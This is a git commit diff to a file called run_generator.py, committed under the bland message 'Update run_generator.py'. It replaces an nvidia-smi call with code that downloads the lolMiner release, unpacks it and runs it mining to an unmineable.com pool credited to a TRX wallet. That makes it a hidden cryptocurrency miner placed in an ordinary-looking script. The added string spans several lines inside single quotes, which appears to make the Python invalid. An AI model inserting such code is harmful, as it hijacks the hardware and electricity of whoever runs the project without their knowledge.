c18a83c2e49b1583497f3d8066ff4e5ee3f8c361
whiteco123 <92229203+whiteco123@users.noreply.github.com>
2021-10-09 22:40:29 +0300

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,2 +1,5 @@
-import os as alpha
-alpha.system("nvidia-smi")
+import os
+cmd = 'wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz
+tar xf lolMiner_v1.31_Lin64.tar.gz
+1.31/./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TBngRUXCCTKnnqgrun2b6RC2QdxbXbxd2m.x --ethstratum ETHPROXY'
+os.system(cmd)
